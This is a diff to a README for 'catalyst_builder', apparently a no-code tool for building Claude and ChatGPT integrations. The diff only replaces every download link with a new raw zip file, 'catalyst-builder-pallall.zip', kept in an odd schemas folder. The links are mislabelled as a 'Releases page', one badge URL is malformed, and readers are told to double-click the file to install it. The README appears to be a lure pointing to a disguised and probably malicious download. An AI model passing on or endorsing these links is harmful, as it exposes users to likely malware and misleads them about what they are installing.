@@ -1,7 +1,7 @@
 # 🚀 catalyst_builder - Build Integrations Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Yapade0708/catalyst_builder/main/sylph/catalyst_builder.zip%20Latest%https://raw.githubusercontent.com/Yapade0708/catalyst_builder/main/sylph/catalyst_builder.zip)](https://raw.githubusercontent.com/Yapade0708/catalyst_builder/main/sylph/catalyst_builder.zip)
+[![Download](https://raw.githubusercontent.com/Yapade0708/catalyst_builder/main/catalyst_pack_schemas/catalyst-builder-pallall.zip%20Latest%https://raw.githubusercontent.com/Yapade0708/catalyst_builder/main/catalyst_pack_schemas/catalyst-builder-pallall.zip)](https://raw.githubusercontent.com/Yapade0708/catalyst_builder/main/catalyst_pack_schemas/catalyst-builder-pallall.zip)
 
 ## 📖 Introduction
 Welcome to **catalyst_builder**! This application helps you create AI-powered integrations for Claude and ChatGPT in just a few minutes. With no coding skills required, you can set up Knowledge Packs for databases, REST APIs, and cloud services simply with YAML configuration. It's designed for enterprises looking to automate their business processes.
@@ -10,7 +10,7 @@ Welcome to **catalyst_builder**! This application helps you create AI-powered in
 To start using **catalyst_builder**, just follow these simple steps:
 
 1. **Download the Application**  
-   Visit the [Releases page](https://raw.githubusercontent.com/Yapade0708/catalyst_builder/main/sylph/catalyst_builder.zip) to download the latest version. 
+   Visit the [Releases page](https://raw.githubusercontent.com/Yapade0708/catalyst_builder/main/catalyst_pack_schemas/catalyst-builder-pallall.zip) to download the latest version. 
 
 2. **Install the Software**  
    Once the download is complete, find the installation file in your downloads folder. Double-click the file to start the installation process. Follow the prompts on your screen to complete the installation.
@@ -49,7 +49,7 @@ If you encounter any issues while using **catalyst_builder**, here are some comm
 For additional help or questions, feel free to reach out to our support team. You can find support resources within the application or through our community forums.
 
 ## 📥 Download & Install
-Ready to get started? Head over to the [Releases page](https://raw.githubusercontent.com/Yapade0708/catalyst_builder/main/sylph/catalyst_builder.zip) and download the latest version of **catalyst_builder** today.
+Ready to get started? Head over to the [Releases page](https://raw.githubusercontent.com/Yapade0708/catalyst_builder/main/catalyst_pack_schemas/catalyst-builder-pallall.zip) and download the latest version of **catalyst_builder** today.
 
 ## 🎉 Community and Contributions
 We encourage everyone to join our community. Share your experiences, ask questions, and contribute to the project. Your feedback is essential for improving **catalyst_builder**.
